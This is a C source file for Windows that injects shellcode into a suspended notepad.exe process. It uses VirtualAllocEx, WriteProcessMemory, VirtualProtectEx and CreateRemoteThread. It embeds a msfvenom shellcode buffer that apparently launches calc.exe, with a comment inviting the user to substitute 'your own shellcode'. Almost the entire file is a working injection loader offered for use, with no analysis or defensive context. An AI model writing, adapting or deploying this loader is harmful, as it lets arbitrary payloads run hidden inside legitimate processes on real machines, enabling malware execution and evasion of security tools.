#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// @ Your own shellcode ( it`s sample is shellcode created with msfvenom, this shellcode just open calculator :D )
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


DWORD GetProcessIdByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Execute notepad.exe with flag SUSPEND
    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        wprintf(L"Failed to start notepad.exe.\n");
        return 1;
    }
    
    wprintf(L"[0x100] Notepad.exe started in suspended state.\n");

    SIZE_T shellcodeSize = sizeof(buf);

    // Opened process
    HANDLE hProcess = pi.hProcess;
    if (hProcess == NULL) {
        wprintf(L"Failed to open process.\n");
        return 1;
    }

    wprintf(L"[0x400] Target process opened.\n");

    // Allocate Memory in target-process
    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteBuffer == NULL) {
        wprintf(L"Failed to allocate memory in process.\n");
        CloseHandle(hProcess);
        return 1;
    }

    wprintf(L"[0x500] Successfully allocated memory in target process.\n");

    // Writing shellcode in allocated-memory
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, buf, shellcodeSize, NULL)) {
        wprintf(L"Failed to write shellcode to process.\n");
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    wprintf(L"[0x666] Successfully wrote shellcode to buffer.\n");

    // Change Access-Rights on PAGE_EXECUTE_READWRITE
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, pRemoteBuffer, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        wprintf(L"Failed to change memory protection.\n");
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    wprintf(L"[0x777] Successfully changed memory protection.\n");

    // Execute thread shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        DWORD error = GetLastError();
        LPVOID errorMsg;
        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR)&errorMsg, 0, NULL);

        wprintf(L"Failed to create remote thread. Error %d: %s\n", error, (LPWSTR)errorMsg);
        LocalFree(errorMsg);

        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    wprintf(L"[0x1000] Successfully created remote thread in target process.\n");

    // Resuming main shellcode-thread
    if (ResumeThread(pi.hThread) == -1) {
        wprintf(L"Failed to resume thread.\n");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    wprintf(L"[0x1100] Successfully resumed target process thread.\n");

    // Waiting for ending shellcode
    // WaitForSingleObject(hThread, INFINITE);

    // Closing Handlers
    CloseHandle(hThread);
    CloseHandle(pi.hThread);

    // VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
    // CloseHandle(hProcess);

    wprintf(L"[+] Injection succeeded.\n");

    return 0;
}
